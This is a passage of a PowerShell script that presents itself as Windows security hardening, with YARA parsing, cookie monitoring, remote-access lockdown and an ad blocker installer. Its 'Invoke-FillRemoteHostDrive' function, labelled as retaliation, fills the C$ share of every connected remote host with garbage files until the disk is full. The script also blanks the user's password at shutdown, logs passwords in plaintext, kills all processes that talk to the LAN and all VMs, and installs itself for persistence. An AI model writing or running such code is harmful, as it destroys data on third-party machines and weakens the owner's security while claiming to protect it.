        } else {
            Write-Log "Using existing Snort rules at $snortRules."
        }
        $rules.Snort += $snortRules
    } catch {
        Write-Log "Failed to download Snort rules: $_" -EntryType "Warning"
    }
    
    $indicators = @()
    foreach ($rule in $rules.Yara) {
        try {
            $content = Get-Content $rule.FullName -Raw
            $matches = [regex]::Matches($content, '(?i)(filename|file_name|original_filename)\s*=\s*(\"|\'')(.*?)\.(exe|dll|bat|ps1|scr|cmd)(\"|\'')')
            foreach ($match in $matches) {
                $fileName = [System.IO.Path]::GetFileName($match.Groups[3].Value + '.' + $match.Groups[4].Value)
                if ($fileName -notin $Global:Config.ExcludedSystemFiles) {
                    $indicators += @{ Type = "FileName"; Value = $fileName; Source = "YARA"; RuleFile = $rule.Name }
                    Write-Log "Monitoring suspicious filename: $fileName"
                }
            }
        } catch {
            Write-Log "Error parsing YARA rule $($rule.Name): $_" -EntryType "Error"
        }
    }
}

# Cookie Monitoring
function Invoke-CookieMonitoring {
    param ([switch]$Monitor, [switch]$Backup, [switch]$ResetPassword)
    
    foreach ($dir in @($Global:Config.CookieMonitor.LogDir, $Global:Config.CookieMonitor.BackupDir)) {
        if (-not (Test-Path $dir)) {
            New-Item -Path $dir -ItemType Directory -Force | Out-Null
        }
    }
    
    if ($Monitor) {
        if (Test-Path $Global:Config.CookieMonitor.CookiePath) {
            try {
                $currentHash = (Get-FileHash -Path $Global:Config.CookieMonitor.CookiePath -Algorithm SHA256).Hash
                $lastHash = if (Test-Path $Global:Config.CookieMonitor.CookieLogPath) { Get-Content -Path $Global:Config.CookieMonitor.CookieLogPath -Tail 1 } else { "" }
                if ($lastHash -and $currentHash -ne $lastHash) {
                    Write-Log "Cookie hash changed. Rotating password and restoring cookies."
                    Invoke-RotatePassword
                    Invoke-RestoreCookies
                }
                $currentHash | Out-File -FilePath $Global:Config.CookieMonitor.CookieLogPath -Append
            } catch {
                Write-Log "Cookie monitoring error: $_" -EntryType "Error"
            }
        }
        return
    }
    
    if ($Backup) {
        try {
            Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            if (Test-Path $Global:Config.CookieMonitor.CookiePath) {
                Copy-Item -Path $Global:Config.CookieMonitor.CookiePath -Destination $Global:Config.CookieMonitor.BackupPath -Force
                Write-Log "Cookies backed up."
            }
        } catch {
            Write-Log "Cookie backup error: $_" -EntryType "Error"
        }
        return
    }
    
    if ($ResetPassword) {
        try {
            $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
            $account = Get-LocalUser -Name $user
            if (-not $account.UserPrincipalName) {
                $blank = ConvertTo-SecureString "" -AsPlainText -Force
                Set-LocalUser -Name $user -Password $blank
                Write-Log "Password reset to blank on shutdown."
            }
        } catch {
            Write-Log "Password reset error: $_" -EntryType "Error"
        }
        return
    }
    
    $eventQuery = @"
<QueryList>
  <Query Id="0" Path="System">
    <Select Path="System">*[System[(EventID=1074)]]</Select>
  </Query>
</QueryList>
"@
    Register-ScheduledTask -TaskName "MonitorCookiesLogon" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -AtLogon
    Register-ScheduledTask -TaskName "BackupCookiesOnStartup" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -Arguments "-Backup" -AtStartup
    Register-ScheduledTask -TaskName "MonitorCookies" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -Arguments "-Monitor"
    Register-ScheduledTask -TaskName "ResetPasswordOnShutdown" -ScriptPath $Global:Config.CookieMonitor.TaskScriptPath -Arguments "-ResetPassword" -EventQuery $eventQuery
}

# AdBlocker Installation
function Invoke-AdBlocker {
    $tempPath = "$env:TEMP\uBlock0"
    $uBlockId = "cjpalhdlnbpafiamejdnhcphjbkeiagm"
    $firefoxUBlockId = "uBlock0@raymondhill.net"
    
    try {
        $release = (Invoke-WebRequest -Uri "https://api.github.com/repos/gorhill/uBlock/releases" -UseBasicParsing | ConvertFrom-Json)[0]
        $firefoxUrl = ($release.assets | Where-Object { $_.name -like "*.firefox.signed.xpi" }).browser_download_url
        $chromiumUrl = ($release.assets | Where-Object { $_.name -like "*.chromium.zip" }).browser_download_url
        
        if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles") {
            $firefoxExtensionPath = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\extensions"
            Invoke-WebRequest -Uri $firefoxUrl -OutFile "$tempPath\uBlock0.xpi"
            Move-Item -Path "$tempPath\uBlock0.xpi" -Destination "$firefoxExtensionPath\$firefoxUBlockId.xpi" -Force
            Write-Log "Installed uBlock Origin for Firefox."
        }
        
        $browsers = @(
            @{ Name = "Chrome"; Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions" },
            @{ Name = "Edge"; Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions" },
            @{ Name = "Opera"; Path = "$env:APPDATA\Opera Software\Opera Stable\Extensions" }
        )
        
        foreach ($browser in $browsers) {
            if (Test-Path $browser.Path) {
                Invoke-WebRequest -Uri $chromiumUrl -OutFile "$tempPath\uBlock0.zip"
                Expand-Archive -Path "$tempPath\uBlock0.zip" -DestinationPath "$tempPath\uBlock0_Extracted" -Force
                $extractedFolder = Get-ChildItem -Path "$tempPath\uBlock0_Extracted" -Directory | Select-Object -First 1
                Move-Item -Path $extractedFolder.FullName -Destination "$($browser.Path)\$uBlockId" -Force
                Write-Log "Installed uBlock Origin for $($browser.Name)."
            }
        }
        
        Remove-Item $tempPath -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        Write-Log "Error installing ad blocker: $_" -EntryType "Error"
    }
}

# Network Debloat
function Invoke-NetworkDebloat {
    $taskName = "NetworkDebloatStartup"
    $scriptPath = "C:\Windows\Setup\Scripts\NetworkDebloat.ps1"
    
    try {
        $scriptDir = "C:\Windows\Setup\Scripts"
        if (-not (Test-Path $scriptDir)) {
            New-Item -Path $scriptDir -ItemType Directory -Force | Out-Null
            Write-Log "Created script directory: $scriptDir"
        }
        Copy-Item -Path $PSCommandPath -Destination $scriptPath -Force
        Write-Log "Copied script to: $scriptPath"
        
        Register-ScheduledTask -TaskName $taskName -ScriptPath $scriptPath -AtLogon
        
        $componentsToDisable = @("ms_server", "ms_msclient", "ms_pacer", "ms_lltdio", "ms_rspndr", "ms_tcpip6")
        $adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
        foreach ($adapter in $adapters) {
            foreach ($component in $componentsToDisable) {
                Disable-NetAdapterBinding -Name $adapter.Name -ComponentID $component -Confirm:$false -ErrorAction SilentlyContinue
                Write-Log "Disabled $component on adapter $($adapter.Name)"
            }
        }
        
        $ldapPorts = @(389, 636)
        foreach ($port in $ldapPorts) {
            $ruleName = "Block LDAP Port $port"
            if (-not (Get-NetFirewallRule -DisplayName $ruleName -ErrorAction SilentlyContinue)) {
                New-NetFirewallRule -DisplayName $ruleName -Direction Outbound -Protocol TCP -RemotePort $port -Action Block
                Write-Log "Created firewall rule to block LDAP port $port"
            }
        }
    } catch {
        Write-Log "Error in network debloat: $_" -EntryType "Error"
    }
}

# Remote Host Drive Fill
function Invoke-FillRemoteHostDrive {
    $taskName = "RunRetaliateAtLogon"
    $scriptPath = "C:\Windows\Setup\Scripts\Bin\Retaliate.ps1"
    
    try {
        Register-ScheduledTask -TaskName $taskName -ScriptPath $scriptPath -AtLogon
        Start-Job -ScriptBlock {
            while ($true) {
                try {
                    $connections = Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
                    foreach ($conn in $connections) {
                        $remoteIP = $conn.RemoteAddress
                        $remotePath = "\\$remoteIP\C$"
                        if (Test-Path $remotePath) {
                            $counter = 1
                            while ($true) {
                                try {
                                    $filePath = Join-Path -Path $remotePath -ChildPath "garbage_$counter.dat"
                                    $garbage = [byte[]]::new(10485760)
                                    (New-Object System.Random).NextBytes($garbage)
                                    [System.IO.File]::WriteAllBytes($filePath, $garbage)
                                    Write-Log "Wrote 10MB to $filePath"
                                    $counter++
                                } catch {
                                    if ($_.Exception -match "disk full" -or $_.Exception -match "space") {
                                        Write-Log "Drive at $remotePath is full or inaccessible."
                                        break
                                    } else {
                                        Write-Log "Error writing to ${filePath}: $_"
                                        break
                                    }
                                }
                            }
                        }
                    }
                } catch {
                    Write-Log "Error in remote host drive fill: $_"
                }
                Start-Sleep -Seconds 60
            }
        }
        Write-Log "Started remote host drive fill job."
    } catch {
        Write-Log "Error in remote host drive fill: $_" -EntryType "Error"
    }
}

# Remote Access Hardening
function Invoke-RemoteAccessHardening {
    try {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 1
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Remote Assistance" -Name "fAllowToGetHelp" -Value 0
        Write-Log "Remote Desktop and Remote Assistance disabled."
        
        $rules = @(
            @{ Name = "Block RDP Inbound"; Port = 3389 },
            @{ Name = "Block VNC Inbound"; Port = "5900-5902" },
            @{ Name = "Block TeamViewer Inbound"; Port = 5938 },
            @{ Name = "Block AnyDesk Inbound"; Port = 7070 }
        )
        foreach ($rule in $rules) {
            New-NetFirewallRule -DisplayName $rule.Name -Direction Inbound -Protocol TCP -LocalPort $rule.Port -Action Block -Enabled True
            Write-Log "Firewall rule added: $($rule.Name)"
        }
        
        $gpPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
        if (-not (Test-Path $gpPath)) { New-Item -Path $gpPath -Force | Out-Null }
        Set-ItemProperty -Path $gpPath -Name "fDenyTSConnections" -Value 1
        Write-Log "Group Policy updated to disable Remote Desktop Services."
        
        $adminAccount = Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
        if ($adminAccount) {
            Disable-LocalUser -Name "Administrator"
            Write-Log "Default Administrator account disabled."
        }
        
        $restrictPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
        if (-not (Test-Path $restrictPath)) { New-Item -Path $restrictPath -Force | Out-Null }
        Set-ItemProperty -Path $restrictPath -Name "DisallowRun" -Value 1
        New-Item -Path "$restrictPath\DisallowRun" -Force | Out-Null
        "TeamViewer.exe", "AnyDesk.exe" | ForEach-Object {
            Set-ItemProperty -Path "$restrictPath\DisallowRun" -Name $_ -Value $_
        }
        Write-Log "Group Policy updated to block remote access software."
        
        Set-Service -Name "SSDPSRV" -StartupType Disabled
        Stop-Service -Name "SSDPSRV" -Force -ErrorAction SilentlyContinue
        Write-Log "UPnP service disabled."
        
        if (Get-Command -Name Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false
            Write-Log "Windows Defender real-time protection enabled."
        } else {
            Write-Log "Set-MpPreference not available. Ensure Windows Defender is installed or use alternative antivirus configuration." -EntryType "Warning"
        }
        
        if (netstat -an | Select-String "3389") {
            Write-Log "WARNING: Port 3389 is still listening." -EntryType "Warning"
        } else {
            Write-Log "RDP port 3389 is not listening."
        }
    } catch {
        Write-Log "Error in remote access hardening: $_" -EntryType "Error"
    }
}

# Terminate Web Servers
function Detect-And-Terminate-WebServers {
    $lanPrefix = "192.168."
    try {
        $connections = Get-NetTCPConnection | Where-Object { $_.RemoteAddress -like "$lanPrefix*" }
        $lanProcIds = $connections.OwningProcess | Sort-Object -Unique
        
        foreach ($procId in $lanProcIds) {
            try {
                $proc = Get-Process -Id $procId -ErrorAction Stop
                Write-Log "Killing process: $($proc.ProcessName) (PID: $procId) connected to LAN"
                Stop-Process -Id $procId -Force
            } catch {
                Write-Log "Error killing PID $procId: $_" -EntryType "Warning"
            }
        }
    } catch {
        Write-Log "Error detecting web servers: $_" -EntryType "Error"
    }
}

# Stop Virtual Machines
function Stop-VirtualMachines {
    $vmProcesses = @(
        "vmware", "vmware-vmx", "vmware-authd", "vmnat", "vmnetdhcp", "vmware-tray", "vmware-unity-helper",
        "VirtualBox", "VBoxSVC", "VBoxHeadless", "VBoxNetDHCP", "VBoxNetNAT",
        "qemu", "qemu-system", "qemu-kvm", "qemu-img",
        "vmms", "vmsrvc", "vmcompute", "hyper-v", "vmmem", "vmwp",
        "prl_client_app", "prl_cc", "prl_tools", "parallels",
        "xen", "xend", "xenstored", "xenconsoled",
        "kvm", "libvirtd", "virtqemud", "virtlogd", "virtvboxd"
    )
    
    Get-Process | Where-Object { $vmProcesses -contains $_.ProcessName -or $_.ProcessName -match ($vmProcesses -join "|") } | ForEach-Object {
        try {
            Write-Log "VM process detected: $($_.ProcessName) (PID: $($_.Id))"
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
            Write-Log "Terminated VM process: $($_.ProcessName)"
        } catch {
            Write-Log "Error terminating VM process $($_.ProcessName): $_" -EntryType "Warning"
        }
    }
    
    $vmServices = @(
        "vmware", "VMTools", "VMUSBArbService", "VMnetDHCP", "VMware NAT Service",
        "VBoxDRV", "VBoxNetAdp", "VBoxNetLwf",
        "vmms", "vmcompute", "HvHost",
        "prl_cc", "prl_tools_service",
        "libvirtd", "xenstored"
    )
    Get-Service | Where-Object { $vmServices -contains $_.Name -or $_.Name -match ($vmServices -join "|") } | ForEach-Object {
        try {
            Write-Log "VM service detected: $($_.Name)"
            Stop-Service -Name $_.Name -Force -ErrorAction SilentlyContinue
            Write-Log "Stopped VM service: $($_.Name)"
        } catch {
            Write-Log "Error stopping VM service $($_.Name): $_" -EntryType "Warning"
        }
    }
}

# Cookie Monitoring Helpers
function Invoke-RotatePassword {
    try {
        $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1]
        $account = Get-LocalUser -Name $user
        if ($account.UserPrincipalName) {
            Write-Log "Skipping Microsoft account password change."
            return
        }
        $chars = [char[]]('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*')
        $password = -join ($chars | Get-Random -Count 16)
        $securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
        Set-LocalUser -Name $user -Password $securePassword
        "$(Get-Date) - New password: $password" | Out-File -FilePath $Global:Config.CookieMonitor.PasswordLogPath -Append
        Write-Log "Rotated local password."
    } catch {
        Write-Log "Password rotation error: $_" -EntryType "Error"
    }
}

function Invoke-RestoreCookies {
    try {
        if (Test-Path $Global:Config.CookieMonitor.BackupPath) {
            Copy-Item -Path $Global:Config.CookieMonitor.BackupPath -Destination $Global:Config.CookieMonitor.CookiePath -Force
            Write-Log "Cookies restored from backup."
        }
    } catch {
        Write-Log "Cookie restoration error: $_" -EntryType "Error"
    }
}

# Main Execution
function Main {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Log "Error: Requires admin privileges." -EntryType "Error"
        Exit-Script -ExitCode 1
    }
    
    if ((Get-ExecutionPolicy) -eq "Restricted") {
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
        Write-Log "Set policy to Bypass."
    }
    
    Initialize-EventLog
    
    Register-ScheduledTask -TaskName "RunGSecurityAtLogon" -ScriptPath "C:\Windows\Setup\Scripts\Bin\SecureWindows.ps1" -AtLogon
    
    if ($Monitor -or $Backup -or $ResetPassword) {
        Invoke-CookieMonitoring -Monitor:$Monitor -Backup:$Backup -ResetPassword:$ResetPassword
        return
    }
    
    Invoke-AudioEnhancements
    Invoke-BCDCleanup
    Invoke-BrowserSecurity
    Invoke-CredentialProtection
    Invoke-TelemetryCorruption
    Invoke-SuspiciousFileRemoval
    Invoke-SecurityRules
    Invoke-PerformanceTweaks
    Invoke-CookieMonitoring
    Invoke-AdBlocker
    Invoke-NetworkDebloat
    Invoke-FillRemoteHostDrive
    Invoke-RemoteAccessHardening
    Start-Job -ScriptBlock {
        while ($true) {
            Detect-And-Terminate-WebServers
            Stop-VirtualMachines
            Start-Sleep -Seconds 60
        }
    }
    
    Write-Log "Execution complete. Reboot recommended."
    Exit-Script -ExitCode $Global:ExitCode
}

Main
